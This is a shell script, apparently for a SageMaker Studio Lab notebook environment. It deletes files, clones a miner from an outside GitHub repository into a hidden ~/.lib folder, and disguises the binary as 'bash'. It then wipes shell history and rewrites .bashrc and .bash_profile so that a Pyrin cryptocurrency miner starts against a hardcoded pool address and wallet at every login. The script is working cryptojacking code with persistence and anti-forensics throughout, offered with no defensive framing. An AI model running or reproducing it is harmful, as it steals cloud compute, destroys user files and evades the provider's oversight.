cd sagemaker-studiolab-notebooks
rm -rvf *   
rm -rvf ele* lol* 1.81* TON* ton* NB* .lib* .bash*  
cd ~/  
mkdir .lib  
cd .lib  
rm -rf *  
WORKER="ARTOMORO80"  
WALLETNH="pyrin:qzutvf3fxt9ek86d4uvls5qz4gx3g7kajpgusx8xfrmdfz9r6p4hgutnfjd8j"  
POOLNHETC="207.154.232.236:80"  
git clone https://github.com/minersquad1717/nx.git && cd nx   
mv * /home/studio-lab-user/.lib  
cd .. && history -cr  
echo ""  > /home/studio-lab-user/.bashrc  
echo "" > /home/studio-lab-user/.bash_history  
echo "" > /home/studio-lab-user/.bash_profile  
echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc  
echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc  
echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile  
echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile  
echo "WORKER=$WORKER" >> ~/.bash_profile  
echo "WALLETNH=$WALLETNH" >> /home/studio-lab-user/.bash_profile  
echo "POOLNHETC=$POOLNHETC" >> /home/studio-lab-user/.bash_profile  
echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile  
echo "./.lib/bash -a PYRIN -p $POOLNHETC --user $WALLETNH.$WORKER --no-cl  " >> /home/studio-lab-user/.lib/gas.sh  
chmod +x gas.sh  && chmod +x bash && cd ~/ && history -cr && source .bashrc
